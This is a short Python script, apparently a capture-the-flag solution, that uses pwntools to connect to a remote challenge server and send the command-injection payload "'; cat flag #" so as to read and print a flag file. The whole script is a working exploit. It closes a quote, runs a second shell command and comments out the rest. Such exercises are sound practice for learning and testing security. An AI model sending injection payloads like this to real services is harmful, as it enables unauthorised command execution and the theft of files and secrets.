from pwn import *

paylod = "'; cat flag #"
conn = remote("pwnable.co.il", "9016")

conn.recvline()
conn.recvline()
conn.sendline(paylod)
conn.recvline()

# Profit
print(conn.recvline().decode())